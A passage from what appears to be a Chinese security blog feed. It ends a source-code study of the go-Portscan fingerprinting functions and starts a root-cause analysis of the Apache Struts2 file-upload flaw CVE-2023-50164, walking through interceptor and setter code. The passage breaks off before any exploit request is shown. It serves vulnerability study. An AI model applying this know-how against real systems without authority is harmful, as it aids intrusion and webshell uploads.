class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-comment">// 指纹匹配函数</span><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">matchRuleWhithBuf</span><span class="hljs-params">(buf, ip net.IP, _port <span class="hljs-type">uint16</span>, rule ruleData)</span></span> <span class="hljs-type">bool</span> &#123;<br>data := []<span class="hljs-type">byte</span>(<span class="hljs-string">&quot;&quot;</span>)<br><span class="hljs-comment">// 逐个判断</span><br><span class="hljs-comment">//for _, rule := range serviceRule.DataGroup &#123;</span><br><span class="hljs-keyword">if</span> rule.Data != <span class="hljs-literal">nil</span> &#123;<br>data = bytes.Replace(rule.Data, []<span class="hljs-type">byte</span>(<span class="hljs-string">&quot;&#123;IP&#125;&quot;</span>), []<span class="hljs-type">byte</span>(ip.String()), <span class="hljs-number">-1</span>)<br>data = bytes.Replace(data, []<span class="hljs-type">byte</span>(<span class="hljs-string">&quot;&#123;PORT&#125;&quot;</span>), []<span class="hljs-type">byte</span>(strconv.Itoa(<span class="hljs-type">int</span>(_port))), <span class="hljs-number">-1</span>)<br>&#125;<br><span class="hljs-comment">// 进行正则匹配</span><br><span class="hljs-keyword">if</span> rule.Regexps != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">for</span> _, _regex := <span class="hljs-keyword">range</span> rule.Regexps &#123;<br><span class="hljs-keyword">if</span> _regex.MatchString(convert2utf8(<span class="hljs-type">string</span>(buf))) &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">true</span><br>&#125;<br>&#125;<br>&#125;<br>    <span class="hljs-comment">// 如果包含就正确</span><br><span class="hljs-keyword">if</span> bytes.Compare(data, []<span class="hljs-type">byte</span>(<span class="hljs-string">&quot;&quot;</span>)) != <span class="hljs-number">0</span> &amp;&amp; bytes.Contains(buf, data) &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">true</span><br>&#125;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">false</span><br>&#125;<br></code></pre></td></tr></table></figure><p>要转 UTF-8 再匹配是因为这个：<a href="https://paper.seebug.org/1679/">Golang 的字符编码与 regexp (seebug.org)</a></p><p><img src="https://blog-1310215391.cos.ap-beijing.myqcloud.com/images/image-20240302164508522.png?imageSlim" alt="image-20240302164508522"></p><p>之后是一个 WEB 指纹识别了；</p><p>指纹是这样的：</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><br>    <span class="hljs-attr">&quot;name&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;08CMS&quot;</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;fingers&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><br>        <span class="hljs-punctuation">&#123;</span><br>            <span class="hljs-attr">&quot;location&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;body&quot;</span><span class="hljs-punctuation">,</span><br>            <span class="hljs-attr">&quot;method&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;keyword&quot;</span><span class="hljs-punctuation">,</span><br>            <span class="hljs-attr">&quot;keyword&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><span class="hljs-string">&quot;content=\&quot;08cms&quot;</span><span class="hljs-punctuation">,</span> <span class="hljs-string">&quot;typeof(_08cms&quot;</span><span class="hljs-punctuation">]</span><br>        <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>        <span class="hljs-punctuation">&#123;</span><br>            <span class="hljs-attr">&quot;location&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;body&quot;</span><span class="hljs-punctuation">,</span><br>            <span class="hljs-attr">&quot;method&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;keyword&quot;</span><span class="hljs-punctuation">,</span><br>            <span class="hljs-attr">&quot;keyword&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><span class="hljs-string">&quot;content=\&quot;08CMS&quot;</span><span class="hljs-punctuation">]</span><br>        <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>        <span class="hljs-punctuation">&#123;</span> <span class="hljs-attr">&quot;location&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;body&quot;</span><span class="hljs-punctuation">,</span> <span class="hljs-attr">&quot;method&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;keyword&quot;</span><span class="hljs-punctuation">,</span> <span class="hljs-attr">&quot;keyword&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><span class="hljs-string">&quot;typeof(_08cms)&quot;</span><span class="hljs-punctuation">]</span> <span class="hljs-punctuation">&#125;</span><br>    <span class="hljs-punctuation">]</span><br><span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br></code></pre></td></tr></table></figure><p>通过正则或者关键字包含来判断：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">iskeyword</span><span class="hljs-params">(str <span class="hljs-type">string</span>, keyword []<span class="hljs-type">string</span>)</span></span> <span class="hljs-type">bool</span> &#123;<br><span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(keyword) == <span class="hljs-number">0</span> || str == <span class="hljs-string">&quot;&quot;</span> &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">false</span><br>&#125;<br><span class="hljs-keyword">for</span> _, k := <span class="hljs-keyword">range</span> keyword &#123;<br><span class="hljs-keyword">if</span> !strings.Contains(str, k) &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">false</span><br>&#125;<br>&#125;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">true</span><br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">isregular</span><span class="hljs-params">(str <span class="hljs-type">string</span>, keyword []<span class="hljs-type">string</span>)</span></span> <span class="hljs-type">bool</span> &#123;<br><span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(keyword) == <span class="hljs-number">0</span> || str == <span class="hljs-string">&quot;&quot;</span> &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">false</span><br>&#125;<br><span class="hljs-keyword">for</span> _, k := <span class="hljs-keyword">range</span> keyword &#123;<br>re := regexp.MustCompile(k)<br><span class="hljs-keyword">if</span> !re.Match([]<span class="hljs-type">byte</span>(str)) &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">false</span><br>&#125;<br>&#125;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">true</span><br>&#125;<br></code></pre></td></tr></table></figure><p>其他的和之前读过的 WEB 指纹识别差不多，就不再细写了。</p><h2 id="学习总结"><a href="#学习总结" class="headerlink" title="学习总结"></a>学习总结</h2><p>go-Portscan 在端口扫描方面做到很全，读一遍对端口扫描即端口指纹识别都有一定的了解，收获挺大。</p>]]></content>
      
      
      <categories>
          
          <category> 技术 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 源码学习 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CVE-2023-50164 Apache Struts2 文件上传漏洞</title>
      <link href="/2024/01/15/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/CVE-2023-50164/"/>
      <url>/2024/01/15/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/CVE-2023-50164/</url>
      
        <content type="html"><![CDATA[<h2 id="漏洞信息"><a href="#漏洞信息" class="headerlink" title="漏洞信息"></a>漏洞信息</h2><p>漏洞介绍：攻击者可以通过污染相关上传参数导致目录遍历，若在具体代码环境中允许上传危险后缀文件（例如 jsp文件），则攻击者可能结合该目录遍历漏洞，可能导致上传 webshell 至可解析目录，执行任意代码。其实就是文件名赋值可控导致的一个漏洞。</p><p>影响范围：</p><ul><li><p>Struts 2.0.0 - Struts 2.3.37</p></li><li><p>Struts 2.5.0- Struts 2.5.32</p></li><li><p>Struts 6.0.0- Struts 6.3.0</p></li></ul><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.apache.struts<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>struts2-core<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>6.2.0<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br></code></pre></td></tr></table></figure><p>struts2 文件上传：<a href="http://gitbook.net/struts2/struts2_file_uploads.html">http://gitbook.net/struts2/struts2_file_uploads.html</a></p><p><img src="https://blog-1310215391.cos.ap-beijing.myqcloud.com/images/21217dd9-66a6-41d2-8e7b-5f1180fb7643.png?imageSlim" alt="image"></p><h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>该漏洞本质上就是去控制 action 中文件名属性的 setter 方法造成覆盖，导致文件名可控，进行目录穿越。</p><p>那么就先过一下 struts2 从上传到调用 setter 方法进行赋值的流程：</p><p>上传文件的数据包：</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs http">------WebKitFormBoundaryBmDSX0yI1bUfsBzp<br><span class="hljs-attribute">Content-Disposition</span><span class="hljs-punctuation">: </span>form-data; name=&quot;myFile&quot;; filename=&quot;demo2.txt&quot;<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>text/plain<br><br>demo context<br>------WebKitFormBoundaryBmDSX0yI1bUfsBzp--<br></code></pre></td></tr></table></figure><p>这里的 myFile 就是 action 这里的属性：</p><p><img src="https://blog-1310215391.cos.ap-beijing.myqcloud.com/images/624164dd-afcd-4537-a687-22070e119fa2.png?imageSlim" alt="image"></p><p>发送数据包后经过 struts2 的 FileUploadIntercept：</p><p>这里主要是去获取文件上传的相关参数，根据 name 去生成 fileNameName 和 contentTypeName</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> String <span class="hljs-title function_">intercept</span><span class="hljs-params">(ActionInvocation invocation)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>    <span class="hljs-comment">// 获取 ActionContext 及 HttpServletRequest</span><br>    <span class="hljs-type">ActionContext</span> <span class="hljs-variable">ac</span> <span class="hljs-operator">=</span> invocation.getInvocationContext();<br>    <span class="hljs-type">HttpServletRequest</span> <span class="hljs-variable">request</span> <span class="hljs-operator">=</span> ac.getServletRequest();<br>    <span class="hljs-comment">// 判断是否为文件上传 MultiPartRequestWrapper 实例</span><br>    <span class="hljs-keyword">if</span> (!(request <span class="hljs-keyword">instanceof</span> MultiPartRequestWrapper)) &#123;<br>            <span class="hljs-comment">// ....</span><br>        &#125;<br>        <span class="hljs-comment">// 获取文件上传的所有的参数名</span><br>        <span class="hljs-type">Enumeration</span> <span class="hljs-variable">fileParameterNames</span> <span class="hljs-operator">=</span> multiWrapper.getFileParameterNames();<br><br>        <span class="hljs-keyword">while</span>(fileParameterNames != <span class="hljs-literal">null</span> &amp;&amp; fileParameterNames.hasMoreElements()) &#123;<br>            <span class="hljs-comment">// 获取文件上传的名称 =&gt; name=&quot;myFile&quot;</span><br>            <span class="hljs-type">String</span> <span class="hljs-variable">inputName</span> <span class="hljs-operator">=</span> (String)fileParameterNames.nextElement();<br>            <span class="hljs-comment">// Content-Type: text/plain</span><br>            String[] contentType = multiWrapper.getContentTypes(inputName);<br>            <span class="hljs-keyword">if</span> (!<span class="hljs-built_in">this</span>.isNonEmpty(contentType)) &#123;<br>                <span class="hljs-keyword">if</span> (LOG.isWarnEnabled()) &#123;<br>                    LOG.warn(<span class="hljs-built_in">this</span>.getTextMessage(action, <span class="hljs-string">&quot;struts.messages.invalid.content.type&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>[]&#123;inputName&#125;));<br>                &#125;<br>            &#125; <span class="hljs-keyword">else</span> &#123;<br>                <span class="hljs-comment">// filename=&quot;demo2.txt&quot;</span><br>                String[] fileName = multiWrapper.getFileNames(inputName);<br>                <span class="hljs-keyword">if</span> (!<span class="hljs-built_in">this</span>.isNonEmpty(fileName)) &#123;<br>                    <span class="hljs-keyword">if</span> (LOG.isWarnEnabled()) &#123;<br>                        LOG.warn(<span class="hljs-built_in">this</span>.getTextMessage(action, <span class="hljs-string">&quot;struts.messages.invalid.file&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>[]&#123;inputName&#125;));<br>                    &#125;<br>                &#125; <span class="hljs-keyword">else</span> &#123;<br>                    <span class="hljs-comment">// 获取上传文件数组 C:\Users\9.....0000.tmp 文件</span><br>                    UploadedFile[] files = multiWrapper.getFiles(inputName);<br>                    <span class="hljs-keyword">if</span> (files != <span class="hljs-literal">null</span> &amp;&amp; files.length &gt; <span class="hljs-number">0</span>) &#123;<br>                        List&lt;UploadedFile&gt; acceptedFiles = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>(files.length);<br>                        List&lt;String&gt; acceptedContentTypes = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>(files.length);<br>                        List&lt;String&gt; acceptedFileNames = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>(files.length);<br>                        <span class="hljs-comment">// 拼接获取 contentTypeName 及 fileNameName</span><br>                        <span class="hljs-comment">// myFileContentType</span><br>                        <span class="hljs-type">String</span> <span class="hljs-variable">contentTypeName</span> <span class="hljs-operator">=</span> inputName + <span class="hljs-string">&quot;ContentType&quot;</span>;<br>                        <span class="hljs-comment">// myFileFileName</span><br>                        <span class="hljs-type">String</span> <span class="hljs-variable">fileNameName</span> <span class="hljs-operator">=</span> inputName + <span class="hljs-string">&quot;FileName&quot;</span>;<br><br>                        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> <span class="hljs-variable">index</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; index &lt; files.length; ++index) &#123;<br>                            <span class="hljs-keyword">if</span> (<span class="hljs-built_in">this</span>.acceptFile(action, files[index], fileName[index], contentType[index], inputName, validation)) &#123;<br>                                acceptedFiles.add(files[index]);<br>                                acceptedContentTypes.add(contentType[index]);<br>                                acceptedFileNames.add(fileName[index]);<br>                            &#125;<br>                        &#125;<br><br>                        <span class="hljs-keyword">if</span> (!acceptedFiles.isEmpty()) &#123;<br>                            <span class="hljs-comment">// 创建一个 HashMap 并把上面修改过的 contentTypeName fileNameName 添加进去</span><br>                            Map&lt;String, Parameter&gt; newParams = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>();<br>                            newParams.put(inputName, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Parameter</span>.File(inputName, acceptedFiles.toArray(<span class="hljs-keyword">new</span> <span class="hljs-title class_">UploadedFile</span>[acceptedFiles.size()])));<br>                            newParams.put(contentTypeName, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Parameter</span>.File(contentTypeName, acceptedContentTypes.toArray(<span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>[acceptedContentTypes.size()])));<br>                            newParams.put(fileNameName, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Parameter</span>.File(fileNameName, acceptedFileNames.toArray(<span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>[acceptedFileNames.size()])));<br>                            <span class="hljs-comment">// 把这个 HashMap 全部添加到这个 ActionContext 的参数中</span><br>                            ac.getParameters().appendAll(newParams);<br>                        &#125;<br>                    &#125;<br>                &#125;<br>            &#125;<br>        &#125;<br><br>        <span class="hljs-keyword">return</span> invocation.invoke();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>看一下这个 appendAll：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> HttpParameters <span class="hljs-title function_">appendAll</span><span class="hljs-params">(Map&lt;String, Parameter&gt; newParams)</span> &#123;<br>    <span class="hljs-comment">// 全部添加到参数中(parameters)</span><br>    <span class="hljs-built_in">this</span>.parameters.putAll(newParams);<br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">this</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>之后获取到了这些参数：</p><p><img src="https://blog-1310215391.cos.ap-beijing.myqcloud.com/images/7a93531b-d09c-428d-92a1-6cf05880ec28.png?imageSlim" alt="image"></p><p>之后就跟一下如何去给文件名赋值：</p><p>这段代码就是将上面获取到的参数和值放到 <strong>ActionContext</strong> 中（ 先添加到一个 TreeMap 再从 TreeMap 放到 ActionContext 中，这里是重点 ）：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setParameters</span><span class="hljs-params">(Object action, ValueStack stack, HttpParameters parameters)</span> &#123;<br>    <span class="hljs-comment">// params =&gt; 上面的 HttpParameters 里面的 parameters</span><br>    HttpParameters params;<br>    TreeMap acceptableParameters;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-built_in">this</span>.ordered) &#123;<br>        params = HttpParameters.create().withComparator(<span class="hljs-built_in">this</span>.getOrderedComparator()).withParent(parameters).build();<br>        acceptableParameters = <span class="hljs-keyword">new</span> <span class="hljs-title class_">TreeMap</span>(<span class="hljs-built_in">this</span>.getOrderedComparator());<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        params = HttpParameters.create().withParent(parameters).build();<br>        acceptableParameters = <span class="hljs-keyword">new</span> <span class="hljs-title class_">TreeMap</span>();<br>    &#125;<br><br>    <span class="hljs-type">Iterator</span> <span class="hljs-variable">var6</span> <span class="hljs-operator">=</span> params.entrySet().iterator();<br><br>    <span class="hljs-keyword">while</span>(var6.hasNext()) &#123;<br>        <span class="hljs-comment">// 检测可接受参数, 添加到 TreeMap acceptableParameters 中</span><br>        Map.Entry&lt;String, Parameter&gt; entry = (Map.Entry)var6.next();<br>        <span class="hljs-type">String</span> <span class="hljs-variable">parameterName</span> <span class="hljs-operator">=</span> (String)entry.getKey();<br>        <span class="hljs-type">boolean</span> <span class="hljs-variable">isAcceptableParameter</span> <span class="hljs-operator">=</span> <span class="hljs-built_in">this</span>.isAcceptableParameter(parameterName, action);<br>        isAcceptableParameter &amp;= <span class="hljs-built_in">this</span>.isAcceptableParameterValue((Parameter)entry.getValue(), action);<br>        <span class="hljs-keyword">if</span> (isAcceptableParameter) &#123;<br>            acceptableParameters.put(parameterName, entry.getValue());<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-type">ValueStack</span> <span class="hljs-variable">newStack</span> <span class="hljs-operator">=</span> <span class="hljs-built_in">this</span>.valueStackFactory.createValueStack(stack);<br>    <span class="hljs-type">boolean</span> <span class="hljs-variable">clearableStack</span> <span class="hljs-operator">=</span> newStack <span class="hljs-keyword">instanceof</span> ClearableValueStack;<br>    <span class="hljs-keyword">if</span> (clearableStack) &#123;<br>        ((ClearableValueStack)newStack).clearContextValues();<br>        Map&lt;String, Object&gt; context = newStack.getContext();<br>        ReflectionContextState.setCreatingNullObjects(context, <span class="hljs-literal">true</span>);<br>        ReflectionContextState.setDenyMethodExecution(context, <span class="hljs-literal">true</span>);<br>        ReflectionContextState.setReportingConversionErrors(context, <span class="hljs-literal">true</span>);<br>        newStack.getActionContext().withLocale(stack.getActionContext().getLocale()).withValueStack(stack);<br>    &#125;<br><br>    <span class="hljs-type">boolean</span> <span class="hljs-variable">memberAccessStack</span> <span class="hljs-operator">=</span> newStack <span class="hljs-keyword">instanceof</span> MemberAccessValueStack;<br>    <span class="hljs-keyword">if</span> (memberAccessStack) &#123;<br>        <span class="hljs-type">MemberAccessValueStack</span> <span class="hljs-variable">accessValueStack</span> <span class="hljs-operator">=</span> (MemberAccessValueStack)newStack;<br>        accessValueStack.setAcceptProperties(<span class="hljs-built_in">this</span>.acceptedPatterns.getAcceptedPatterns());<br>        accessValueStack.setExcludeProperties(<span class="hljs-built_in">this</span>.excludedPatterns.getExcludedPatterns());<br>    &#125;<br><br>    <span class="hljs-type">Iterator</span> <span class="hljs-variable">var20</span> <span class="hljs-operator">=</span> acceptableParameters.entrySet().iterator();<br><br>    <span class="hljs-keyword">while</span>(var20.hasNext()) &#123;<br>        Map.Entry&lt;String, Parameter&gt; entry = (Map.Entry)var20.next();<br>        <span class="hljs-type">String</span> <span class="hljs-variable">name</span> <span class="hljs-operator">=</span> (String)entry.getKey();<br>        <span class="hljs-type">Parameter</span> <span class="hljs-variable">value</span> <span class="hljs-operator">=</span> (Parameter)entry.getValue();<br><br>        <span class="hljs-keyword">try</span> &#123;<br>            newStack.setParameter(name, value.getObject());<br>        &#125; <span class="hljs-keyword">catch</span> (RuntimeException var14) &#123;<br>            <span class="hljs-keyword">if</span> (<span class="hljs-built_in">this</span>.devMode) &#123;<br>                <span class="hljs-built_in">this</span>.notifyDeveloperParameterException(action, name, var14.getMessage());<br>            &#125;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">if</span> (clearableStack) &#123;<br>        stack.getActionContext().withConversionErrors(newStack.getActionContext().getConversionErrors());<br>    &#125;<br><br>    <span class="hljs-built_in">this</span>.addParametersToContext(ActionContext.getContext(), acceptableParameters);<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://blog-1310215391.cos.ap-beijing.myqcloud.com/images/4de25a8e-1c23-43f7-9917-14d05cc681a0.png?imageSlim" alt="image"></p><p>再后面会对这些参数做一个处理（ 首字母大写后调用其 setter 方法赋值 ）：</p><ol><li>首字母大写第二个小写直接返回</li><li>首字母小写给它大写后返回</li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> String <span class="hljs-title function_">capitalizeBeanPropertyName</span><span class="hljs-params">(String propertyName)</span> &#123;<br>    <span class="hljs-keyword">if</span> (propertyName.length() == <span class="hljs-number">1</span>) &#123;<br>        <span class="hljs-comment">// 属性名长度为 1 转换为大写后返回</span><br>        <span class="hljs-keyword">return</span> propertyName.toUpperCase();<br>    &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (propertyName.startsWith(<span class="hljs-string">&quot;get&quot;</span>) &amp;&amp; propertyName.endsWith(<span class="hljs-string">&quot;()&quot;</span>) &amp;&amp; Character.isUpperCase(propertyName.substring(<span class="hljs-number">3</span>, <span class="hljs-number">4</span>).charAt(<span class="hljs-number">0</span>))) &#123;<br>        <span class="hljs-comment">// 检查是否符合 getter 方法的命名规范，若符合则返回原属性名</span><br>        <span class="hljs-keyword">return</span> propertyName;<br>    &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (propertyName.startsWith(<span class="hljs-string">&quot;set&quot;</span>) &amp;&amp; propertyName.endsWith(<span class="hljs-string">&quot;)&quot;</span>) &amp;&amp; Character.isUpperCase(propertyName.substring(<span class="hljs-number">3</span>, <span class="hljs-number">4</span>).charAt(<span class="hljs-number">0</span>))) &#123;<br>        <span class="hljs-comment">// 检查是否符合 setter 方法的命名规范，若符合则返回原属性名</span><br>        <span class="hljs-keyword">return</span> propertyName;<br>    &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (propertyName.startsWith(<span class="hljs-string">&quot;is&quot;</span>) &amp;&amp; propertyName.endsWith(<span class="hljs-string">&quot;()&quot;</span>) &amp;&amp; Character.isUpperCase(propertyName.substring(<span class="hljs-number">2</span>, <span class="hljs-number">3</span>).charAt(<span class="hljs-number">0</span>))) &#123;<br>        <span class="hljs-comment">// ...</span><br>        <span class="hljs-keyword">return</span> propertyName;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-type">char</span> <span class="hljs-variable">first</span> <span class="hljs-operator">=</span> propertyName.charAt(<span class="hljs-number">0</span>);<br>        <span class="hljs-type">char</span> <span class="hljs-variable">second</span> <span class="hljs-operator">=</span> propertyName.charAt(<span class="hljs-number">1</span>);<br>        <span class="hljs-keyword">if</span> (Character.isLowerCase(first) &amp;&amp; Character.isUpperCase(second)) &#123;<br>            <span class="hljs-comment">// 如果第一个字符为小写且第二个字符为大写，则返回原属性名</span><br>            <span class="hljs-keyword">return</span> propertyName;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-comment">// 否则将首字母大写并返回</span><br>            <span class="hljs-comment">// myFileFileName =&gt; 